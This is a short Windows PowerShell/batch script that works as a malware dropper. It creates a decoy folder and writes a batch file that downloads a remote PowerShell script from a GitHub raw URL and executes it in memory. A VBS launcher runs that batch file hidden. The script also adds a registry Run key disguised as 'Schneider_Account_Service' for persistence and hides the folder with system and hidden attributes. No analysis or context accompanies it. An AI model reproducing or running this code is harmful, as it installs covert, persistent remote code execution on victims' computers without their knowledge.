md C:\Intel\Profiles/IE/IEX2; $contentToAdd = @"
powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/key.ps1').GetResponse().GetResponseStream()).ReadToEnd());
"@; add-content "C:\Intel\Profiles/IE/IEX2/MSDLDSIM.bat" $contenttoadd; $contentToAdd = @"
WScript.Sleep 10000
set objshell = createobject("wscript.shell")
objshell.run "C:\Intel\Profiles/IE/IEX2\MSDLDSIM.bat",vbhide
"@; add-content "C:\Intel\Profiles/IE/IEX2/MSDLDSIM.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Schneider_Account_Service /d C:\Intel\Profiles\IE\IEX2\MSDLDSIM.vbs; cd C:\Intel\Profiles\IE\IEX2; ./MSDLDSIM.vbs
cd C:\
attrib +s +r +h +a intel
exit
